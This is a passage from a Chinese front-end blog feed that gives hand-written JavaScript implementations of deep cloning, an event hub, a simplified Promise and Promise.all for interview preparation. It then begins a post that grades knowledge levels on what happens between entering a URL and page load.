target = <span class="keyword">new</span> <span class="title class_">Date</span>(source);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">RegExp</span>) &#123;</span><br><span class="line">          target = <span class="keyword">new</span> <span class="title class_">RegExp</span>(source.<span class="property">source</span>, source.<span class="property">flags</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">cacheList</span>.<span class="title function_">push</span>([source, target]); <span class="comment">// 把源对象和新对象放进缓存列表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">          <span class="keyword">if</span> (source.<span class="title function_">hasOwnProperty</span>(key)) &#123; <span class="comment">// 不拷贝原型上的属性，太浪费内存</span></span><br><span class="line">            target[key] = <span class="variable language_">this</span>.<span class="title function_">clone</span>(source[key]); <span class="comment">// 递归克隆</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> source;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">findCache</span>(<span class="params">source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">cacheList</span>.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">cacheList</span>[i][<span class="number">0</span>] === source) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">cacheList</span>[i][<span class="number">1</span>]; <span class="comment">// 如果有环，返回对应的新对象</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充一句，如果您想看详细的测试与运行结果，请参见 <a href="https://link.zhihu.com/?target=https://github.com/venaissance/source-deepClone">我的 GitHub →</a><br />递归克隆看起来很强大，但是完美无缺吗？其实还是有不小的距离：</p><ol><li>对象类型支持不够多（Buffer，Map，Set等都不支持）</li><li>存在递归爆栈的风险</li></ol><p>如果要解决这些问题，实现一个”完美“的深拷贝，只能求教上百行代码的 <a href="https://link.zhihu.com/?target=https://github.com/lodash/lodash/blob/master/cloneDeep.js">Lodash.cloneDeep()</a> 了 。<br />让我们再引申一下，深拷贝有局限吗？<br><a name="hlf23"></a></p><h2 id="深拷贝的局限"><a href="#深拷贝的局限" class="headerlink" title="深拷贝的局限"></a>深拷贝的局限</h2><p>如果需要对一个复杂对象进行频繁操作，每次都完全深拷贝一次的话性能岂不是太差了，因为大部分场景下都只是更新了这个对象的某几个字段，而其他的字段都不变，对这些不变的字段的拷贝明显是多余的。那么问题来了，浅拷贝不更新，深拷贝性能差，怎么办？<br />这里推荐3个可以实现”部分“深拷贝的库：</p><ol><li><a href="https://link.zhihu.com/?target=https://immutable-js.github.io/immutable-js/">Immutable.js</a> Immutable.js 会把对象所有的 key 进行 hash 映射，将得到的 hash 值转化为二进制，从后向前每 5 位进行分割后再转化为 Trie 树。Trie 树利用这些 hash 值的公共前缀来减少查询时间，最大限度地减少无谓 key 的比较。关于 Trie 树（字典树）的介绍，可以看我的博客<a href="https://zhuanlan.zhihu.com/p/136103651">算法基础06-字典树、并查集、高级搜索、红黑树、AVL 树</a></li><li><a href="https://link.zhihu.com/?target=https://github.com/rtfeldman/seamless-immutable">seamless-immutable</a>，如果数据量不大但想用这种类似 updateIn 便利的语法的话可以用 seamless-immutable。这个库就没有上面的 Trie 树这些幺蛾子了，就是为其扩展了 updateIn、merge 等 9 个方法的普通简单对象，利用 Object.freeze 冻结对象本身改动, 每次修改返回副本。感觉像是阉割版，性能不及 Immutable.js，但在部分场景下也是适用的。</li><li><a href="https://link.zhihu.com/?target=https://github.com/immerjs/immer">Immer.js</a>，通过用来数据劫持的 Proxy 实现：对原始数据中每个访问到的节点都创建一个 Proxy，修改节点时修改副本而不操作原数据，最后返回到对象由未修改的部分和已修改的副本组成。（这不就是 Vue3 数据响应式原理嘛）<br><a name="ZzcKr"></a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看完这一段，你现在能回答怎么实现深拷贝了吗？概括成一句就是：<strong>简单需求用 JSON 反序列化，复杂需求用递归克隆</strong>。<br />对于递归克隆的深拷贝，核心有三点：</p><ol><li><strong>对象分类</strong></li><li><strong>递归</strong></li><li>用<strong>缓存</strong>对付<strong>环</strong></li></ol><hr><p><a name="QMocX"></a></p><h2 id="手写-EventHub（发布-订阅）"><a href="#手写-EventHub（发布-订阅）" class="headerlink" title="手写 EventHub（发布-订阅）"></a>手写 EventHub（发布-订阅）</h2><p>核心思路是：</p><ol><li>使用一个对象作为<strong>缓存</strong></li><li>on 负责把方法<strong>发布</strong>到缓存的 EventName 对应的数组</li><li>emit 负责遍历触发<strong>（订阅）</strong> EventName 下的方法数组</li><li>off <strong>找</strong>方法的<strong>索引</strong>，并删除</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EventHub</span> &#123;</span><br><span class="line">  cache = &#123;&#125;;</span><br><span class="line">  <span class="title function_">on</span>(<span class="params">eventName, fn</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName] = <span class="variable language_">this</span>.<span class="property">cache</span>[eventName] || [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName].<span class="title function_">push</span>(fn);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">eventName</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName].<span class="title function_">forEach</span>(<span class="function">(<span class="params">fn</span>) =&gt;</span> <span class="title function_">fn</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">off</span>(<span class="params">eventName, fn</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = <span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">cache</span>[eventName], fn); <span class="comment">// 这里用 this.cache[eventName].indexOf(fn) 完全可以，封装成函数是为了向下兼容</span></span><br><span class="line">    <span class="keyword">if</span> (index === -<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName].<span class="title function_">splice</span>(index, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 兼容 IE 8 的 indexOf</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">indexOf</span>(<span class="params">arr, item</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr === <span class="literal">undefined</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> index = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] === item) &#123;</span><br><span class="line">      index = i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果您想看详细的测试与运行结果，请参见 <a href="https://link.zhihu.com/?target=https://github.com/venaissance/ts-source-EventHub">我的 GitHub →</a></p><hr><p><a name="kGhQd"></a></p><h2 id="手写-Promise"><a href="#手写-Promise" class="headerlink" title="手写 Promise"></a>手写 Promise</h2><p>无疑是要求最高的，如果要硬按照 Promises&#x2F;A+ 规范来写，可能至少要 2-3 个小时，400+行代码，这种情况是几乎不可能出现在面试中。所以我们只需要完成一个<strong>差不多</strong>的版本，保留最核心的功能。<br />核心功能：</p><ul><li>new Promise(fn) 其中 fn 只能为函数，且要<strong>立即执行</strong></li><li>promise.then(success, fail)中的 success 是函数，且会在 resolve 被调用的时候执行，fail 同理</li></ul><p>实现思路：</p><ol><li>then(succeed, fail) 先把成功失败回调放到一个回调数组 callbacks[] 上</li><li>resolve() 和 reject() 遍历 callbacks</li><li>resolve() 读取成功回调 &#x2F; reject() 读取失败回调，并异步执行 callbacks 里面的成功和失败回调（放到本轮的微任务队列中）</li></ol><p>下面分享我自己根据上述需求及思路实现的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Promise2</span> &#123;</span><br><span class="line">  state = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">  callbacks = [];</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;must pass function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fn</span>(<span class="variable language_">this</span>.<span class="property">resolve</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="variable language_">this</span>.<span class="property">reject</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="params">result</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&quot;fulfilled&quot;</span>;</span><br><span class="line">    <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">handle</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> handle[<span class="number">0</span>] === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">          handle[<span class="number">0</span>].<span class="title function_">call</span>(<span class="literal">undefined</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">    <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">handle</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> handle[<span class="number">1</span>] === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">          handle[<span class="number">1</span>].<span class="title function_">call</span>(<span class="literal">undefined</span>, reason);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">then</span>(<span class="params">succeed, fail</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> handle = [];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> succeed === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      handle[<span class="number">0</span>] = succeed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fail === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      handle[<span class="number">1</span>] = fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(handle);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nextTick</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (process !== <span class="literal">undefined</span> &amp;&amp; <span class="keyword">typeof</span> process.<span class="property">nextTick</span> === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> process.<span class="title function_">nextTick</span>(fn);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 用MutationObserver实现浏览器上的nextTick</span></span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(fn);</span><br><span class="line">    <span class="keyword">var</span> textNode = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="title class_">String</span>(counter));</span><br><span class="line"></span><br><span class="line">    observer.<span class="title function_">observe</span>(textNode, &#123;</span><br><span class="line">      <span class="attr">characterData</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line">    textNode.<span class="property">data</span> = <span class="title class_">String</span>(counter);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，如果您想看详细的测试与运行结果，请参见 <a href="https://link.zhihu.com/?target=https://github.com/venaissance/ts-source-promise">我的 GitHub →</a></p><hr><p><a name="HjuHV"></a></p><h2 id="手写-Promise-all"><a href="#手写-Promise-all" class="headerlink" title="手写 Promise.all()"></a>手写 Promise.all()</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">PromiseAll</span>(<span class="params">promiseArray</span>) &#123;    <span class="comment">//返回一个Promise对象</span></span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(promiseArray)) &#123;                        <span class="comment">//传入的参数是否为数组</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;传入的参数不是数组！&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> res = []</span><br><span class="line">        <span class="keyword">let</span> counter = <span class="number">0</span>                         <span class="comment">//设置一个计数器</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; promiseArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(promiseArray[i]).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">                counter++                  <span class="comment">//使用计数器返回 必须使用counter</span></span><br><span class="line">                res[i] = value</span><br><span class="line">                <span class="keyword">if</span> (counter === promiseArray.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(res)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">reject</span>(e))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上为核心实现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">res</span>(<span class="string">&#x27;p1&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">res</span>(<span class="string">&#x27;p2&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p3 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">res</span>(<span class="string">&#x27;p3&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> test = <span class="title class_">PromiseAll</span>([p1, p2, p3])</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test);</span><br></pre></td></tr></table></figure><p><a name="C9epL"></a></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>总结一下，会手写关键代码对技术发展的重要性是不言而喻的，所以大家一定要勇于克服自己内心的恐惧，<strong>刻意练习</strong>，终有一天，你会体会到技术精进的快感！</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从输入url到页面加载</title>
      <link href="/2020/04/08/frontend/browser/cong-shu-ru-url-dao-ye-mian-jia-zai/"/>
      <url>/2020/04/08/frontend/browser/cong-shu-ru-url-dao-ye-mian-jia-zai/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="section-3"></a></p><h2 id="对知识体系进行一次预评级"><a href="#对知识体系进行一次预评级" class="headerlink" title="对知识体系进行一次预评级"></a>对知识体系进行一次预评级</h2><p>看到这道题目，不借助搜索引擎，自己的心里是否有一个答案？<br />这里，以目前的经验（了解过一些处于不同阶段的相关前端人员的情况），大概有以下几种情况：（以下都是以点见面，实际上不同阶段人员一般都会有其它的隐藏知识点的）<br><a name="section-3-1"></a></p><h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a><strong>level1:</strong></h3><p>完全没什么概念的，支支吾吾的回答，一般就是这种水平（大致形象点描述）：</p><blockquote><ul><li>浏览器发起请求</li><li>服务端返回数据</li><li>前端解析成网页，执行脚本。。。</li></ul></blockquote><p>这类人员一般都是：</p><ul><li>萌新（刚接触前端的，包括0-6个月都有可能有这种回答）</li><li>沉淀人员（就是那种可能已经接触了前端几年，但是仍然处于初级阶段的那种。。。）</li></ul><p>当然了，后者一般还会偶尔提下<code>**http**</code><strong>、</strong><code>**后台**</code><strong>、</strong><code>**浏览器渲染**</code><strong>，</strong><code>**js引擎**</code>等等关键字，但基本都是一详细的问就不知道了。。。</p><p><a name="section-3-2"></a></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a><strong>level2:</strong></h3><p>已经有初步概念，但是可能没有完整梳理过，导致无法形成一个完整的体系，或者是很多细节都不会展开，大概是这样子的：（可能符合若干条）</p><blockquote><ul><li>知道浏览器输入url后会有http请求这个概念</li><li>有后台这个概念，大致知道前后端的交互，知道前后端只要靠http报文通信</li><li>知道浏览器接收到数据后会进行解析，有一定概念，但是具体流程不熟悉（如render树构建流程，layout、paint，复合层与简单层，常用优化方案等不是很熟悉）</li><li>对于js引擎的解析流程有一定概念，但是细节不熟悉（如具体的形参，函数，变量提升，执行上下文以及VO、AO、作用域链，回收机制等概念不是很熟悉）</li><li>如可能知道一些http规范初步概念，但是不熟悉（如http报文结构，常用头部，缓存机制，http2.0，https等特性，跨域与web安全等不是很熟悉）</li></ul></blockquote><p>到这里，看到这上面一大堆的概念后，心里应该也会有点底了。。。<br /><strong>实际上，大部分的前端人员可能都处于level2</strong>，但是，跳出这个阶段并不容易，一般需要积累，不断学习，才能水到渠成<br />这类人员一般都是：</p><ul><li>工作1-3年左右的普通人员（占大多数，而且大多数人员工作3年左右并没有实质上的提升）</li><li>工作3年以上的老人（这部分人大多都业务十分娴熟，一个当好几个用，但是，基础比较薄弱，可能没有尝试写过框架、组件、脚手架等）</li></ul><p>大部分的初中级都陷在这个阶段，如果要突破，不断学习，积累，自然能水到渠成，打通任督二脉</p><p><a name="section-3-3"></a></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a><strong>level3:</strong></h3><p>基本能到这一步的，不是高阶就是接近高阶，因为很多概念并不是靠背就能理解的，而要理解这么多，需形成体系，一般都需要积累，非一日之功。<br />一般包括什么样的回答呢？（这里就以自己的简略回答进行举例），一般这个阶段的人员都会符合若干条（不一定全部，当然可能还有些是这里遗漏的）:</p><blockquote><ul><li>首先略去那些键盘输入、和操作系统交互、以及屏幕显示原理、网卡等硬件交互之类的（前端向中，很多硬件原理暂时略去。。。）</li><li>对浏览器模型有整体概念，知道浏览器是多进程的，浏览器内核是多线程的，清楚进程与线程之间得区别，以及输入url后会开一个新的网络线程</li><li>对从开启网络线程到发出一个完整的http请求中间的过程有所了解（如dns查询，tcp&#x2F;ip链接，五层因特网协议栈等等，以及一些优化方案，如<code>dns-prefetch</code>）</li><li>对从服务器接收到请求到对应后台接收到请求有一定了解（如负载均衡，安全拦截以及后台代码处理等）</li><li>对后台和前台的http交互熟悉（包括http报文结构，场景头部，cookie，跨域，web安全，http缓存，http2.0，https等）</li><li>对浏览器接收到http数据包后的解析流程熟悉（包括解析html，词法分析然后解析成dom树、解析css生成css规则树、合并成render树，然后layout、painting渲染、里面可能还包括复合图层的合成、GPU绘制、外链处理、加载顺序等）</li><li>对JS引擎解析过程熟悉（包括JS的解释，预处理，执行上下文，VO，作用域链，this，回收机制等）</li></ul></blockquote><p>可以看到，上述包括了一大堆的概念，仅仅是偏前端向，而且没有详细展开，就已经如此之多的概念了，所以，个人认为如果没有自己的见解，没有形成自己的知识体系，仅仅是看看，背背是没用的，过一段时间就会忘光了。<br />再说下一般这个阶段的都可能是什么样的人吧。（不一定准确，这里主要是靠少部分现实以及大部分推测得出）</p><ul><li>工作2年以上的前端（基本上如果按正常进度的话，至少接触前端两年左右才会开始走向高阶，当然，现在很多都是上学时就开始学了的，还有部分是天赋异禀，不好预估。。。）</li><li>或者是已经十分熟悉其它某门语言，再转前端的人（基本上是很快就可以将前端水准提升上去）</li></ul><p>一般符合这个条件的都会有各种隐藏属性（如看过各大框架、组件的源码，写过自己的组件、框架、脚手架，做过大型项目，整理过若干精品博文等）</p><p><a name="section-3-4"></a></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a><strong>level4:</strong></h3><p>由于本人层次尚未达到，所以大致说下自己的见解吧。<br />一般这个层次，很多大佬都并不仅仅是某个技术栈了，而是成为了技术专家，技术leader之类的角色。所以仅仅是回答某个技术问题已经无法看出水准了， 可能更多的要看架构，整体把控，大型工程构建能力等等<br />不过，对于某些执着于技术的大佬，大概会有一些回答吧：（猜的）</p><blockquote><ul><li>从键盘谈起到系统交互</li><li>从浏览器到CPU</li><li>从调度机制到系统内核</li><li>从数据请求到二进制、汇编</li><li>从GPU绘图到LCD显示</li><li>然后再分析系统底层的进程、内存等等</li></ul></blockquote><p>总之，从软件到硬件，到材料，到分子，原子，量子，薛定谔的猫，人类起源，宇宙大爆炸，平行宇宙？感觉都毫无违和感。。。<br />这点可以参考下本题的原始出处：<br /><a href="http://fex.baidu.com/blog/2014/05/what-happen/">从输入 URL 到页面加载完成的过程中都发生了什么事情？</a></p><p><a name="section-4"></a></p><h2 id="为什么说知识体系如此重要？"><a href="#为什么说知识体系如此重要？" class="headerlink" title="为什么说知识体系如此重要？"></a>为什么说知识体系如此重要？</h2><p>为什么说知识体系如此重要呢？这里举几个例子<br />假设有被问到这样一道题目（随意想到的一个）：</p><ul><li>如何理解<code>getComputedStyle</code></li></ul><p>在尚未梳理知识体系前，大概会这样回答：</p><ul><li>普通版本：<code>getComputedStyle</code>会获取当前元素所有最终使用的CSS属性值（最终计算后的结果），通过<code>window.getComputedStyle</code>等价于<code>document.defaultView.getComputedStyle</code>调用</li><li>详细版本：<code>window.getComputedStyle(elem, null).getPropertyValue(&quot;height&quot;)</code>可能的值为<code>100px</code>，而且，就算是css上写的是<code>inherit</code>，<code>getComputedStyle</code>也会把它最终计算出来的。不过注意，如果元素的背景色透明，那么<code>getComputedStyle</code>获取出来的就是透明的这个背景（因为透明本身也是有效的），而不会是父节点的背景。所以它不一定是最终显示的颜色。</li></ul><p>就这个API来说，上述的回答已经比较全面了。<br />但是，其实它是可以继续延伸的。<br />譬如现在会这样回答：</p><ul><li><code>getComputedStyle</code>会获取当前元素所有最终使用的CSS属性值，<code>window.</code>和<code>document.defaultView.</code>等价…</li><li><code>getComputedStyle</code>会引起回流，因为它需要获取祖先节点的一些信息进行计算（譬如宽高等），所以用的时候慎用，回流会引起性能问题。然后合适的话会将话题引导回流，重绘，浏览器渲染原理等等。当然也可以列举一些其它会引发回流的操作，如<code>offsetXXX</code>，<code>scrollXXX</code>，<code>clientXXX</code>，<code>currentStyle</code>等等</li></ul><p>再举一个例子：</p><ul><li><code>visibility: hidden</code>和<code>display: 